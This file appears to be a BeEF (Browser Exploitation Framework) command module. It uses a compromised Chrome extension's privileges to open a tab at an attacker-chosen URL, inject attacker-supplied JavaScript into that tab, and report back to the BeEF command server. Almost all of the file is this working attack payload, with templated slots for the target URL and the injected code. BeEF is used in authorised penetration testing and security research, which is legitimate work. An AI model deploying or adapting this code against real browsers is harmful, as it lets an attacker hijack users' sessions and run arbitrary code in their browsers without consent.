//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	try{
		chrome.tabs.create({url:"<%= @url %>"}, function(tab){
			chrome.tabs.executeScript(tab.id,{code:"<%= @theJS %>"}, function(){
               beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Code executed on tab.id: ' + tab.id);
            });
		});
	} catch(error){
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Not inside of a Chrome Extension');
	}
});

